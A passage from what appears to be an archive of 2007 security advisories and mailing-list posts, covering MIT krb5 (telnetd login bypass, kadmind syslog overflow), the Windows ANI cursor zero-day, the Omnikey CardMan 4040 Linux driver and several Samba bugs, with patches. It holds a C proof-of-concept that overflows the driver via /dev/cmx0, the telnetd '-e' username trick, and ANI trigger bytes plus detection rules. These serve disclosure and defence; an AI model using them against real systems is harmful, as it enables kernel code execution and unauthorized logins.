patch; see ""DETAILS"".
Please note that releases prior to krb5-1.5 will require additional
changes to the configure script src/lib/kadm5/configure in order to
correctly detect the presence of vsnprintf(). krb5-1.5 and later
releases already check for vsnprintf() in the top-level configure
script, and do not have a separate src/lib/kadm5/configure script.
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2007-002-syslog.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVE: CVE-2007-0957
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0957
CERT: VU#704024
http://www.kb.cert.org/vuls/id/704024
ACKNOWLEDGMENTS
===============
We thank iDefense Labs for notifying us of this vulnerability.
iDefense credits an anonymous discoverer.
DETAILS
=======
krb5_klog_syslog() uses vsprintf() to format text into a fixed-length
stack buffer. Format specifiers such as ""%s"" used in calls to
krb5_klog_syslog() may allow formatting of strings of sufficient
length to overwrite memory past the end of the stack buffer.
Certain strings received from the client by the kadmin daemon are not
truncated prior to logging. Among these strings is the target
principal for the kadmin operation.
The KDC truncates most client-originated strings prior to logging.
One sort of string which is not truncated is a transited-realms
string. A malicious KDC sharing a key with the target realm may issue
tickets with specially-crafted transited-realms strings to exploit
this vulnerability. There are other places where an authenticated
user may cause the KDC to log a string which triggers the
vulnerability.
On a system where vsnprintf() is confirmed to be available, the
patches to files other than src/lib/kadm5/logger.c may not be
necessary to prevent a buffer overflow; these patches are still useful
to prevent malicious users from causing vsnprintf() to obliterate
useful log information by means of truncation.
REVISION HISTORY
================
2007-04-03 original release
Copyright (C) 2007 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (SunOS)
iQCVAwUBRhKVS6bDgE/zdoE9AQJlZgQAq/IvVdpkf3VNViwuZaAJ31+mqq17gKqX
9DkxkvpPD2b5/8N/ouywP/ODCpYpT9Y+mU+Cw/hEfL2otv/o1HJcV7CXPRCEFODs
YKpi2Sahcxs+jl1ZQfsY63oay6urZ0PTcrZTFQuqOv8B0wVd0XUwrSkBLejZszL3
YUFR4W+wtbg=
=GsBC
-----END PGP SIGNATURE-----"
26009,MITKRB5-SA-2007-001: telnetd allows login as arbitrary user [CVE-2007-0956],,CVE-2007-0956,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MIT krb5 Security Advisory 2007-001
Original release: 2007-04-03
Last update: 2007-04-03
Topic: telnetd allows login as arbitrary user
Severity: CRITICAL
CVE: CVE-2007-0956
CERT: VU#220816
SUMMARY
=======
The MIT krb5 telnet daemon (telnetd) allows unauthorized login as an
arbitrary user, when presented with a specially crafted username.
Exploitation of this vulnerability is trivial.
This is a vulnerability in an application program; it is not a bug in
the MIT krb5 libraries or in the Kerberos protocol.
IMPACT
======
A user can gain unauthorized access to any account (including root) on
a host running telnetd. Whether the attacker needs to authenticate
depends on the configuration of telnetd on that host.
AFFECTED SOFTWARE
=================
* telnetd in all releases of MIT krb5, up to and including krb5-1.6
FIXES
=====
* The upcoming krb5-1.6.1 release will contain a fix for this
vulnerability.
Prior to that release you may:
* disable telnetd
or
* apply the patch
This patch is also available at
http://web.mit.edu/kerberos/advisories/2007-001-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2007-001-patch.txt.asc
*** src/appl/telnet/telnetd/state.c (revision 19480)
- --- src/appl/telnet/telnetd/state.c (local)
***************
*** 1665,1671 ****
strcmp(varp, ""RESOLV_HOST_CONF"") && /* linux */
strcmp(varp, ""NLSPATH"") && /* locale stuff */
strncmp(varp, ""LC_"", strlen(""LC_"")) && /* locale stuff */
! strcmp(varp, ""IFS"")) {
return 1;
} else {
syslog(LOG_INFO, ""Rejected the attempt to modify the environment variable ""%s"""", varp);
- --- 1665,1672 ----
strcmp(varp, ""RESOLV_HOST_CONF"") && /* linux */
strcmp(varp, ""NLSPATH"") && /* locale stuff */
strncmp(varp, ""LC_"", strlen(""LC_"")) && /* locale stuff */
! strcmp(varp, ""IFS"") &&
! !strchr(varp, '-')) {
return 1;
} else {
syslog(LOG_INFO, ""Rejected the attempt to modify the environment variable ""%s"""", varp);
*** src/appl/telnet/telnetd/sys_term.c (revision 19480)
- --- src/appl/telnet/telnetd/sys_term.c (local)
***************
*** 1287,1292 ****
- --- 1287,1302 ----
#endif
#if defined (AUTHENTICATION)
if (auth_level >= 0 && autologin == AUTH_VALID) {
+ if (name[0] == '-') {
+ /* Authenticated and authorized to log in to an
+ account starting with '-'? Even if that
+ unlikely case comes to pass, the current login
+ program will not parse the resulting command
+ line properly. */
+ syslog(LOG_ERR, ""user name cannot start with '-'"");
+ fatal(net, ""user name cannot start with '-'"");
+ exit(1);
+ }
# if !defined(NO_LOGIN_F)
#if defined(LOGIN_CAP_F)
argv = addarg(argv, ""-F"");
***************
*** 1377,1387 ****
} else
#endif
if (getenv(""USER"")) {
! argv = addarg(argv, getenv(""USER""));
#if defined(LOGIN_ARGS) && defined(NO_LOGIN_P)
{
register char **cpp;
for (cpp = environ; *cpp; cpp++)
argv = addarg(argv, *cpp);
}
#endif
- --- 1387,1405 ----
} else
#endif
if (getenv(""USER"")) {
! char *user = getenv(""USER"");
! if (user[0] == '-') {
! /* ""telnet -l-x ..."" */
! syslog(LOG_ERR, ""user name cannot start with '-'"");
! fatal(net, ""user name cannot start with '-'"");
! exit(1);
! }
! argv = addarg(argv, user);
#if defined(LOGIN_ARGS) && defined(NO_LOGIN_P)
{
register char **cpp;
for (cpp = environ; *cpp; cpp++)
+ if ((*cpp)[0] != '-')
argv = addarg(argv, *cpp);
}
#endif
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2007-001-telnetd.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVE: CVE-2007-0956
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0956
CERT: VU#220816
http://www.kb.cert.org/vuls/id/220816
ACKNOWLEDGMENTS
===============
This vulnerability was found when attempting to confirm the absence of
a related vulnerability in the Solaris telnetd. [CVE-2007-0882]
DETAILS
=======
The MIT krb5 telnet daemon fails to adequately check the provided
username. A malformed username beginning with ""-e"" can be interpreted
as a command-line flag by the login.krb5 program, which is executed by
telnetd. This causes login.krb5 to execute part of the BSD rlogin
protocol, where an arbitrary username may be injected, allowing login
as that user without a password or any further authentication.
If the telnet daemon is configured to only permit authenticated login,
then only authenticated users can exploit this vulnerability.
REVISION HISTORY
================
2007-04-03 original release
Copyright (C) 2007 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (SunOS)
iQCVAwUBRhKVRabDgE/zdoE9AQIzPAQAj8a7ShfHXVVMOPQhEyoN/Ydnalnfa2xE
cl7UXFSjmkexalD+rymL0upLFw7EVgnYrVazc+AUhDLt1AZmCl5Lj2+WAcl1QYPu
fEGm2SFaS4Eda6NRb6xZ4BeY8zfRWFN2G8Bb5krpGj+oEX/c3Xg8O4oUyiJBYBQi
TXhryamn6Yw=
=aE5C
-----END PGP SIGNATURE-----"
26049,Re: 0-day ANI vulnerability in Microsoft Windows (CVE-2007-0038),,CVE-2007-0038,"On Thu, 29 Mar 2007, Alexander Sotirov wrote:
> Today Microsoft released a security advisory about a vulnerability in the
> Animated Cursor processing code in Windows:
> http://www.microsoft.com/technet/security/advisory/935423.mspx
>
> It seems like the vulnerability is already exploited in the wild:
> http://asert.arbornetworks.com/2007/03/any-ani-file-could-infect-you/
Bleeding Edge Threats made available Snort rule that detects some (all?)
exploits using this vulnerability:
http://www.bleedingthreats.net/index.php/2007/03/30/ms-ani-exploit-rule-details-emerging/
I don't know if this rule detects all possible exploits or just one
particular type. Here is a Firekeeper version of the rule, which can
be used to detect sites hosting malicious files:
alert (msg:""BLEEDING-EDGE CURRENT EVENTS MS ANI exploit""; body_content:""|54 53 49 4C 03 00 00 00 00 00 00 00 54 53 49 4C 04 00 00 00 02 02 02 02 61 6E 69 68 52|""; reference:url,http://isc.sans.org/diary.html?storyid=2534; reference:url,http://www.avertlabs.com/research/blog/?p=233; reference:url,doc.bleedingthreats.net/2003519; fid:2003519; rev:1;)
Rule is triggered for example by the following images:
http://www.i5460.net/admin12/2.jpg
http://www.i5460.net/admin12/1.jpg
Cheers,
Jan Wrobel
http://firekeeper.mozdev.org"
26053,RE: [Full-disclosure] 0-day ANI vulnerability in Microsoft Windows(CVE-2007-0038),,CVE-2007-0038,"You really need to check for:
RIFF[4 byte file size] <-- The file size can be ignored.
Then the next 4 byte after the file size should contain:
ACON
Then look for:
anih and the 4 byte value following it greater than 0x50, this is the
stack buffer overflow point. New ANIs can be built with any number of
anih chunks and only one of them needs to be larger than 80 bytes
decimal.
Cheers,
Eric Sites, CTO
Sunbelt Software
-----Original Message-----
From: full-disclosure-bounces lists grok org uk
[mailto:full-disclosure-bounces lists grok org uk] On Behalf Of
Alexander Sotirov
Sent: Friday, March 30, 2007 8:29 PM
To: Jan Wrobel
Cc: full-disclosure lists grok org uk; bugtraq securityfocus com
Subject: Re: [Full-disclosure] 0-day ANI vulnerability in Microsoft
Windows(CVE-2007-0038)
Jan Wrobel wrote:
> I don't know if this rule detects all possible exploits or just one
> particular type. Here is a Firekeeper version of the rule, which can
> be used to detect sites hosting malicious files:
>
> alert (msg:""BLEEDING-EDGE CURRENT EVENTS MS ANI exploit"";
body_content:""|54 53 49 4C 03 00 00 00 00 00 00 00 54 53 49 4C 04 00 00
00 02 02 02 02 61 6E 69 68 52|"";
reference:url,http://isc.sans.org/diary.html?storyid=2534;
reference:url,http://www.avertlabs.com/research/blog/?p=233;
reference:url,doc.bleedingthreats.net/2003519; fid:2003519; rev:1;)
A better way would be to look for all files that start with ""RIFF"" and
contain
two copies of the string ""anih"", the first one followed by the dword
0x24, the
second one followed by a dword that's not 0x24. This should detect the
exploitation of the stack overflow with no false negatives. To avoid
false
positives, you'll need code to parse all records in the ANI file and
check for
more an ""anih"" record with a size not equal to 0x24.
Here's the regexp in Perl (somebody please convert it to a Snort rule)
/^RIFF.*anihx24x00x00x00.*anih(?!x24x00x00x00)/
Alex
.."
26061,0-day ANI vulnerability in Microsoft Windows (CVE-2007-0038),,CVE-2007-0038,"Today Microsoft released a security advisory about a vulnerability in the
Animated Cursor processing code in Windows:
http://www.microsoft.com/technet/security/advisory/935423.mspx
It seems like the vulnerability is already exploited in the wild:
http://asert.arbornetworks.com/2007/03/any-ani-file-could-infect-you/
This is one of the vulnerabilities Determina discovered and reported to
Microsoft back in December of last year. It was assigned CVE-2007-0038 and we
published a brief advisory about it today:
http://www.determina.com/security_center/security_advisories/securityadvisory_0day_032907.asp
The vulnerability is trivially exploitable on all versions of Windows, including
Vista. The protected mode of IE7 will lessen the impact of the vulnerability,
but shellcode execution is of course still possible. Determina also discovered
that under certain circumstances Mozilla Firefox uses the same underlying
Windows code for processing ANI files, and can be exploited similarly to
Internet Explorer.
As noted in Microsoft's security advisory, workarounds for this vulnerability
are limited at this point. I personally recommend browsing the web and reading
mail with telnet until patches are available.
Of course, Determina VPS Desktop and Server Edition have been continuously
protecting against this vulnerability even prior to its discovery.
Alexander Sotirov
Determina Security Research"
26342,Buffer Overflow in Linux Drivers for Omnikey CardMan 4040 (CVE-2007-0005),,CVE-2007-0005,"#############################################################
#
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#
#############################################################
#
# Product: Linux Driver for Omnikey CardMan 4040
# Vendor: Omnikey GmbH / Harald Welte
# Subject: Buffer Overflow
# Risk: Medium
# Effect: Locally exploitable
# Author: Daniel Roethlisberger (daniel.roethlisberger csnc ch)
# Date: 2007-03-07
# CVE Name: CVE-2007-0005
#
#############################################################
Introduction:
-------------
The Linux drivers for the Omnikey CardMan 4040 smartcard reader contain
a buffer overflow vulnerability. Local attackers with direct or
indirect write permissions to a cmx device file can execute arbitrary
code with kernel privileges or may cause denial of service.
Vulnerable:
-----------
* Linux 2.4/2.6 cm4040 drivers by Omnikey:
- cm4040 v1.1.0
- cm4040 v1.2.0
- cm4040 v2.0.0
* Linux 2.6 cm4040 drivers by Harald Welte, as included in:
- Linux 2.6.15 ... 2.6.20.1
Not vulnerable:
---------------
* Linux 2.4/2.6 cm4040 drivers by Omnikey:
- cm4040 v1.0.0
* FreeBSD cmx driver by Daniel Roethlisberger
Not tested:
-----------
* Other Linux driver versions
* Drivers for MacOS X, Windows
Technical Description:
----------------------
While using the Linux drivers for the CM4040 as a reference for writing
a cmx FreeBSD driver, Compass Security has discovered two buffer
overflows in the Linux drivers. One of them in the write() and another
one in the read() handler.
When calling write() with a buffer larger than 512 bytes, the driver's
write buffer overflows, allowing to overwrite the EIP and execute
arbitrary code with kernel privileges.
In the read() handler, there is a similar problem with data originating
in the device. A malicious or buggy device sending more than 512 bytes
can overflow the driver's read buffer to the same effect.
Of course, the write() vulnerability is only exploitable by users with
direct or indirect write access to the cmx device special file. By
default, direct access is limited to root. Therefore, one might think
this is not an issue. However, unprivileged users may cause large
indirect writes via userland daemons such as those provided by pcsc-lite
or openct. Since ""normal"" APDUs are smaller than 512 bytes, this may
not be an issue, but I haven't looked into the various ways to cause
data to be written indirectly.
Furthermore, a system can be set up to allow access to the device for a
special user or group in order to increase security by running the
userland drivers without root privileges. In such a setup users with
access to the device can escalate privileges or cause DoS.
PoC Code:
---------
/*
* Linux Omnikey Cardman 4040 driver buffer overflow (CVE-2007-0005)
* Copyright (C) Daniel Roethlisberger <daniel.roethlisberger csnc ch>
* Compass Security Network Computing AG, Rapperswil, Switzerland.
* All rights reserved.
* http://www.csnc.ch/
*/
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<errno.h>
int main(int argc, char *argv[]) {
int fd, i, n;
char buf[8192];
/*
* 0 1 2 3 4 5 6 7 8 9 a b c d e f ...
* 00 01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 ...
*/
for (i = 0; i < sizeof(buf); i += 2) {
buf[i] = (char)(((i/2) & 0xFF00) >> 8);
buf[i+1] = (char) ((i/2) & 0x00FF);
}
if ((fd = open(""/dev/cmx0"", O_RDWR)) < 0) {
printf(""Error: open() => %s "", strerror(errno));
exit(errno);
}
if ((n = write(fd, buf, sizeof(buf))) < 0) {
printf(""Error: write() => %s "", strerror(errno));
exit(errno);
}
printf(""%d of %d bytes written "", n, sizeof(buf));
exit(0);
}
Workaround:
-----------
Patch available: http://lkml.org/lkml/2007/3/6/386
Timeline:
---------
Vendor Status: Linux 2.6.21-rc3 contains the patch.
Omnikey will fix it in their next driver release.
Vendor Notified: 2007-02-05 (Harald Welte)
2007-02-06 (vendor-sec, Omnikey)
Vendor Response: Will fix (Harald Welte, vendor-sec)
Will fix but not coordinate release schedule (Omnikey)
Embargo Until: 2007-03-06
--
Daniel Roethlisberger, Compass Security Network Computing AG
Glaernischstrasse 7, CH-8640 Rapperswil, Switzerland
Tel +41 55 214 41 77
Fax +41 55 214 41 61
daniel.roethlisberger csnc ch
http://www.csnc.ch/
PGP: D927 96F6 7266 1683 06CF F984 ACEC DBB0 6929 2CBA
Security Review - Penetration Testing - Computer Forensics"
26776,Unofficial SQL-Ledger patch for CVE-2007-0667,,CVE-2007-0667,"This patch was made against SQL-Ledger 2.6.18 but just modifies a few lines in the redirect() function in the Form.pm. I have decided that it is probably best to release the patch and then wait a while before releasing full disclosure. The author of SQL-Ledger has declined to use this patch.
Best Wishes,
Chris Travers"
26785,[SAMBA-SECURITY] CVE-2007-0454: Format string bug in afsacl.so VFS plugin,,CVE-2007-0454,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Format string bug in afsacl.so VFS plugin.
== CVE ID#: CVE-2007-0454
==
== Versions: The AFS ACL mapping VFS plugin distributed
== in Samba 3.0.6 - 3.0.23d (inclusive)
==
== Summary: The name of a file on the server's share
== is used as the format string when setting
== an NT security descriptor through the
== afsacl.so VFS plugin.
==
==========================================================
===========
Description
===========
NOTE: This security advisory only impacts Samba servers
that share AFS file systems to CIFS clients and which have
been explicitly instructed in smb.conf to load the afsacl.so
VFS module.
The source defect results in the name of a file stored on
disk being used as the format string in a call to snprintf().
This bug becomes exploitable only when a user is able
to write to a share which utilizes Samba's afsacl.so library
for setting Windows NT access control lists on files residing
on an AFS file system.
==================
Patch Availability
==================
A patch against Samba 3.0.23d has been attached to this
email. This fix has be incorporated into the Samba 3.0.24
release. Patches are also available from at the Samba Security
page (http://www.samba.org/samba/security).
==========
Workaround
==========
An unpatched server may be protected by removing all
references to the afsacl.so VFS module from shares in
smb.conf.
=======
Credits
=======
This vulnerability was reported (including a proposed patch)
to Samba developers by <zybadawg333 hushmail com>. Much thanks
to zybadawg333 for the cooperation and patience in the
announcement of this defect. The time line is as follows:
* Jan 8, 2007: Defect first reported to the security samba org
email alias.
* Jan 8, 2007: Initial developer response by Jeremy Allison
confirming the issue.
* Jan 29, 2007: Announcement to vendor-sec mailing list
* Feb 5, 2007: Public issue of security advisory.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFFxzBuIR7qMdg1EfYRAo60AJ0XPkH0pkfsmxIAVF1HxgqFl3qyXQCgzAg/
VdQre1squwORUgRaNA2F3rU=
=93rK
-----END PGP SIGNATURE-----

diff -urN samba-3.0.23d/source/modules/vfs_afsacl.c samba/source/modules/vfs_afsacl.c
--- samba-3.0.23d/source/modules/vfs_afsacl.c 2006-06-23 08:16:50.000000000 -0500
+++ samba/source/modules/vfs_afsacl.c 2007-01-29 20:11:07.000000000 -0600
@@ -901,7 +901,7 @@
ZERO_STRUCT(dir_acl);
ZERO_STRUCT(file_acl);
- pstr_sprintf(name, fsp->fsp_name);
+ pstrcpy(name, fsp->fsp_name);
if (!fsp->is_directory) {
/* We need to get the name of the directory containing the

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
iD8DBQBFvrtvIR7qMdg1EfYRAqGvAJ4onsF4xrEJRULF8wELiui9gWtHJQCcD9Od
GLlJYcMRe3wLaXf5ddU7FPc=
=tb2W
-----END PGP SIGNATURE-----"
26786,[SAMBA-SECURITY] CVE-2007-0452: Potential DoS against smbd in Samba 3.0.6 - 3.0.23d,,CVE-2007-0452,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Potential Denial of Service bug in smbd
== CVE ID#: CVE-2007-0452
==
== Versions: Samba 3.0.6 - 3.0.23d (inclusive)
==
== Summary: A logic error in the deferred open code
== can lead to an infinite loop in smbd
==
==========================================================
===========
Description
===========
Internally Samba's file server daemon, smbd, implements
support for deferred file open calls in an attempt to serve
client requests that would otherwise fail due to a share mode
violation. When renaming a file under certain circumstances
it is possible that the request is never removed from the deferred
open queue. smbd will then become stuck is a loop trying to
service the open request.
This bug may allow an authenticated user to exhaust resources
such as memory and CPU on the server by opening multiple CIFS
sessions, each of which will normally spawn a new smbd process,
and sending each connection into an infinite loop.
==================
Patch Availability
==================
A patch against Samba 3.0.23d has been attached to this
email. This fix has be incorporated into the Samba 3.0.24
release. Patches are also available from at the Samba Security
page (http://www.samba.org/samba/security).
==========
Workaround
==========
The bug is believed to be exploitable only by an authenticated
user. The server's exposure can be alleviated by disabling
any suspect or hostile user accounts.
=======
Credits
=======
This vulnerability was found during internal regression
testing by Samba developers.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFFxzBfIR7qMdg1EfYRAgpMAKCBiRQFeyl598Bf2V7WPxOEVZjQRQCgtQh7
ualQZpxcejQhlaYVxbKVpqg=
=V048
-----END PGP SIGNATURE-----

diff -urN samba-3.0.23d/source/printing/nt_printing.c samba/source/printing/nt_printing.c
--- samba-3.0.23d/source/printing/nt_printing.c 2006-07-10 11:27:50.000000000 -0500
+++ samba/source/printing/nt_printing.c 2007-01-30 15:00:45.000000000 -0600
@@ -4839,7 +4839,7 @@
pstrcpy( file, s );
driver_unix_convert(file, conn, NULL, &bad_path, &st);
DEBUG(10,(""deleting driverfile [%s] "", s));
- unlink_internals(conn, 0, file, False);
+ unlink_internals(conn, 0, file, False, False);
}
}

@@ -4848,7 +4848,7 @@
pstrcpy( file, s );
driver_unix_convert(file, conn, NULL, &bad_path, &st);
DEBUG(10,(""deleting configfile [%s] "", s));
- unlink_internals(conn, 0, file, False);
+ unlink_internals(conn, 0, file, False, False);
}
}

@@ -4857,7 +4857,7 @@
pstrcpy( file, s );
driver_unix_convert(file, conn, NULL, &bad_path, &st);
DEBUG(10,(""deleting datafile [%s] "", s));
- unlink_internals(conn, 0, file, False);
+ unlink_internals(conn, 0, file, False, False);
}
}

@@ -4866,7 +4866,7 @@
pstrcpy( file, s );
driver_unix_convert(file, conn, NULL, &bad_path, &st);
DEBUG(10,(""deleting helpfile [%s] "", s));
- unlink_internals(conn, 0, file, False);
+ unlink_internals(conn, 0, file, False, False);
}
}

@@ -4882,7 +4882,7 @@
pstrcpy( file, p );
driver_unix_convert(file, conn, NULL, &bad_path, &st);
DEBUG(10,(""deleting dependent file [%s] "", file));
- unlink_internals(conn, 0, file, False);
+ unlink_internals(conn, 0, file, False, False);
}

i++;
diff -urN samba-3.0.23d/source/smbd/nttrans.c samba/source/smbd/nttrans.c
--- samba-3.0.23d/source/smbd/nttrans.c 2006-06-23 08:16:49.000000000 -0500
+++ samba/source/smbd/nttrans.c 2007-01-30 15:00:45.000000000 -0600
@@ -664,7 +664,7 @@
if (lp_acl_check_permissions(SNUM(conn)) && (share_access & FILE_SHARE_DELETE)
&& (access_mask & DELETE_ACCESS)) {
#endif
- status = can_delete(conn, fname, file_attributes, bad_path, True);
+ status = can_delete(conn, fname, file_attributes, bad_path, True, False);
/* We're only going to fail here if it's access denied, as that's the
only error we care about for ""can we delete this ?"" questions. */
if (!NT_STATUS_IS_OK(status) && (NT_STATUS_EQUAL(status,NT_STATUS_ACCESS_DENIED) ||
@@ -1281,7 +1281,7 @@
/* Setting FILE_SHARE_DELETE is the hint. */
if (lp_acl_check_permissions(SNUM(conn)) && (share_access & FILE_SHARE_DELETE) && (access_mask & DELETE_ACCESS)) {
#endif
- status = can_delete(conn, fname, file_attributes, bad_path, True);
+ status = can_delete(conn, fname, file_attributes, bad_path, True, False);
/* We're only going to fail here if it's access denied, as that's the
only error we care about for ""can we delete this ?"" questions. */
if (!NT_STATUS_IS_OK(status) && (NT_STATUS_EQUAL(status,NT_STATUS_ACCESS_DENIED) ||
@@ -1888,8 +1888,14 @@
status = rename_internals(conn, fsp->fsp_name,
new_name, 0, replace_if_exists, path_contains_wcard);
- if (!NT_STATUS_IS_OK(status))
+
+ if (!NT_STATUS_IS_OK(status)) {
+ if (open_was_deferred(SVAL(inbuf,smb_mid))) {
+ /* We have re-scheduled this call. */
+ return -1;
+ }
return ERROR_NT(status);
+ }
/*
* Rename was successful.
diff -urN samba-3.0.23d/source/smbd/reply.c samba/source/smbd/reply.c
--- samba-3.0.23d/source/smbd/reply.c 2006-06-23 08:16:49.000000000 -0500
+++ samba/source/smbd/reply.c 2007-01-30 15:00:45.000000000 -0600
@@ -1865,7 +1865,7 @@
Check if a user is allowed to delete a file.
********************************************************************/
-NTSTATUS can_delete(connection_struct *conn, char *fname, uint32 dirtype, BOOL bad_path, BOOL check_is_at_open)
+NTSTATUS can_delete(connection_struct *conn, char *fname, uint32 dirtype, BOOL bad_path, BOOL check_is_at_open, BOOL can_defer)
{
SMB_STRUCT_STAT sbuf;
uint32 fattr;
@@ -1938,7 +1938,7 @@
FILE_OPEN,
0,
FILE_ATTRIBUTE_NORMAL,
- 0,
+ can_defer ? 0 : INTERNAL_OPEN_ONLY,
NULL);
if (!fsp) {
@@ -1960,7 +1960,7 @@
code.
****************************************************************************/
-NTSTATUS unlink_internals(connection_struct *conn, uint32 dirtype, char *name, BOOL has_wild)
+NTSTATUS unlink_internals(connection_struct *conn, uint32 dirtype, char *name, BOOL has_wild, BOOL can_defer)
{
pstring directory;
pstring mask;
@@ -2000,7 +2000,7 @@
if (!has_wild) {
pstrcat(directory,""/"");
pstrcat(directory,mask);
- error = can_delete(conn,directory,dirtype,bad_path,False);
+ error = can_delete(conn,directory,dirtype,bad_path,False,can_defer);
if (!NT_STATUS_IS_OK(error))
return error;
@@ -2058,7 +2058,7 @@
}
slprintf(fname,sizeof(fname)-1, ""%s/%s"",directory,dname);
- error = can_delete(conn,fname,dirtype,bad_path,False);
+ error = can_delete(conn,fname,dirtype,bad_path,False,False);
if (!NT_STATUS_IS_OK(error)) {
continue;
}
@@ -2104,7 +2104,7 @@

DEBUG(3,(""reply_unlink : %s "",name));

- status = unlink_internals(conn, dirtype, name, path_contains_wcard);
+ status = unlink_internals(conn, dirtype, name, path_contains_wcard, True);
if (!NT_STATUS_IS_OK(status)) {
if (open_was_deferred(SVAL(inbuf,smb_mid))) {
/* We have re-scheduled this call. */
diff -urN samba-3.0.23d/source/smbd/trans2.c samba/source/smbd/trans2.c
--- samba-3.0.23d/source/smbd/trans2.c 2006-11-14 08:42:12.000000000 -0600
+++ samba/source/smbd/trans2.c 2007-01-30 15:00:35.000000000 -0600
@@ -4446,9 +4446,15 @@
fname, newname ));
status = rename_internals(conn, fname, base_name, 0, overwrite, False);
}
+
if (!NT_STATUS_IS_OK(status)) {
+ if (open_was_deferred(SVAL(inbuf,smb_mid))) {
+ /* We have re-scheduled this call. */
+ return -1;
+ }
return ERROR_NT(status);
}
+
process_pending_change_notify_queue((time_t)0);
SSVAL(params,0,0);
send_trans2_replies(outbuf, bufsize, params, 2, *ppdata, 0);

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
iD8DBQBFv7OdIR7qMdg1EfYRAvqJAKDxefpzTjYvJWyHB0D/7hZ+tx417QCfaD9k
G+tjNn+wuqQeRDWcvuCcbY0=
=I+1e
-----END PGP SIGNATURE-----"
26787,[SAMBA-SECURITY] CVE-2007-0453: Buffer overrun in nss_winbind.so.1 on Solaris,,CVE-2007-0453,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================
==
== Subject: Buffer overrun in NSS host lookup Winbind
== library on Solaris
== CVE ID#: CVE-2007-0453
==
== Versions: Samba 3.0.21 - 3.0.23d (inclusive) running on
== Sun Solaris
==
== Summary: A potential overrun in the gethostbyname()
== and getipnodebyname() in the nss_winbind.so.1
== library on Solaris can potentially allow
== for code execution.
==
==========================================================
===========
Description
===========
NOTE: This security advisory only affects Sun Solaris
systems running Samba's winbindd daemon and configured to
make use of the nss_winbind.so.1 library for gethostbyname()
and getipnodebyname() name resolution queries. For example,
## /etc/nsswitch.conf
...
ipnodes: files winbind
hosts: files winbind
The buffer overrun is caused by copying a string passed
into the NSS interface into a static buffer prior to sending
the request to the winbindd daemon.
==================
Patch Availability
==================
A patch against Samba 3.0.23d has been attached to this
email. This fix has be incorporated into the Samba 3.0.24
release. Patches are also available from at the Samba Security
page (http://www.samba.org/samba/security).
==========
Workaround
==========
An unpatched Solaris server may be protected by removing
the 'winbind' entry from the hosts and ipnodes services in
/etc/nsswitch.conf.
=======
Credits
=======
This vulnerability was reported (including a proposed patch)
to Samba developers by Olivier Gay <ouah ouah org>. Much thanks
to Olivier for his cooperation and patience in the announcement
of this defect. The time line is as follows:
* Dec 15, 2006: Defect first reported to the security samba org
email alias.
* Dec 21, 2006: Initial developer response by Andrew Tridgell
confirming the issue.
* Jan 29, 2007: Announcement to vendor-sec mailing list
* Feb 5, 2007: Public issue of security advisory.
==========================================================
== Our Code, Our Bugs, Our Responsibility.
== The Samba Team
==========================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFFxzAOIR7qMdg1EfYRAgUoAKCq+KSsNDdpUnToyFtNoMDckMKLHACfet2h
uQ+KAyjI8jTU6nAZHY3v+vI=
=f1TQ
-----END PGP SIGNATURE-----

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
iD8DBQBFvqTIIR7qMdg1EfYRAtaeAJ481DWXPQZcVTGpVT08I3JL3MSa/wCgsrHG
TVy0PqEZqIscoUa0DBegnL4=
=sQHh
-----END PGP SIGNATURE-----

diff -urN samba-3.0.23d/source/nsswitch/winbind_nss_solaris.c samba/source/nsswitch/winbind_nss_solaris.c
--- samba-3.0.23d/source/nsswitch/winbind_nss_solaris.c 2006-04-19 21:29:21.000000000 -0500
+++ samba/source/nsswitch/winbind_nss_solaris.c 2007-01-29 19:51:11.000000000 -0600
@@ -493,7 +493,8 @@
af = AF_INET6;
#endif
- strncpy(request.data.winsreq, argp->key.name, strlen(argp->key.name)) ;
+ strncpy(request.data.winsreq, argp->key.name, sizeof(request.data.winsreq) - 1);
+ request.data.winsreq[sizeof(request.data.winsreq) - 1] = '';
if( (ret = winbindd_request_response(WINBINDD_WINS_BYNAME, &request, &response))
== NSS_STATUS_SUCCESS ) {
@@ -515,7 +516,8 @@
ZERO_STRUCT(response);
ZERO_STRUCT(request);

- strncpy(request.data.winsreq, argp->key.name, strlen(argp->key.name));
+ strncpy(request.data.winsreq, argp->key.name, sizeof(request.data.winsreq) - 1);
